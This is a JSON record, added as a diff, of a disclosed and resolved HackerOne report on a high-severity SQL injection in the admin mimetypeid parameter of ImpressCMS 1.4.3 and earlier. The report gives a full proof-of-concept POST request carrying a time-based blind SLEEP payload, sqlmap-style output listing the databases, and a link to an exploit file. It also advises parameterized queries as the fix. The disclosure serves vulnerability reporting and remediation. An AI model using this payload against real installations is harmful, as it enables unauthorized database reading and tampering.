@@ -1,0 +1,136 @@
+{
+  "id": 1506129,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTA2MTI5",
+  "url": "https://hackerone.com/reports/1506129",
+  "title": "SQL Injection in version 1.4.3 and below",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-03-10T07:55:41.423Z",
+  "submitted_at": "2022-03-10T07:55:41.510Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cyberinsane",
+    "url": "/cyberinsane",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ej40kdyol0z9sfzlm9j5ktttmcf8/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 38302,
+    "url": "https://hackerone.com/impresscms",
+    "handle": "impresscms",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/302/c9f69b5546e2b4211c0a26681a398b1685cc5ebb_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/302/c9f69b5546e2b4211c0a26681a398b1685cc5ebb_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "ImpressCMS",
+      "twitter_handle": "impresscms",
+      "website": "https://www.impresscms.org",
+      "about": "PHP and MySQL Open source content management system for multiple languages"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-08-12T16:44:07.273Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-07-13T16:44:06.429Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nSQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.\n\n## ImpressCMS branch :\n[1.4]\n## Browsers Verified In:\n\n  Google Chrome, Firefox]\n\n## Steps To Reproduce:\nStep1- Login with Admin Credentials\nStep2- Vulnerable Parameter to SQLi: mimetypeid (POST request):\n\nPOST /ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1 HTTP/1.1\nHost: 192.168.56.117\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------40629177308912268471540748701\nContent-Length: 1011\nOrigin: http://192.168.56.117\nConnection: close\nReferer: http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1\nCookie: tbl_SystemMimetype_sortsel=mimetypeid; tbl_limitsel=15; tbl_SystemMimetype_filtersel=default; ICMSSESSION=7c9f7a65572d2aa40f66a0d468bb20e3\nUpgrade-Insecure-Requests: 1\n\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"mimetypeid\"\n\n1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"extension\"\n\nbin\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"types\"\n\napplication/octet-stream\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"name\"\n\nBinary File/Linux Executable\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"icms_page_before_form\"\n\nhttp://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"op\"\n\naddmimetype\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"modify_button\"\n\nSubmit\n-----------------------------40629177308912268471540748701--\n\nVulnerable Payload:\n1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)   //time-based blind (query SLEEP)\n\nOutput:\nweb application technology: Apache 2.4.52, PHP 7.4.27\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\navailable databases [6]:\n[*] impresscms\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] phpmyadmin\n[*] test\n\n## Suggestions to mitigate or resolve the issue:\nUse Parameterized Queries\n\n## Supporting Material/References:\nhttps://github.com/sartlabs/0days/blob/main/ImpressCMS1.4.3/Exploit.txt\n\n  * [attachment / reference]\n\n## Impact\n\nSQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-08-12T16:44:06.569Z",
+  "allow_singular_disclosure_after": -86480548.2362045,
+  "singular_disclosure_allowed": true,
+  "vote_count": 32,
+  "voters": [
+    "zy9ard3",
+    "shreyaschavhan",
+    "address_below0",
+    "shubham_srt",
+    "2026",
+    "jackiehavoltrey",
+    "0xun7h1nk4ble",
+    "cyberinsane",
+    "kerolesmagdy",
+    "shivammusic",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.4,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 28943,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/impresscms/impresscms",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
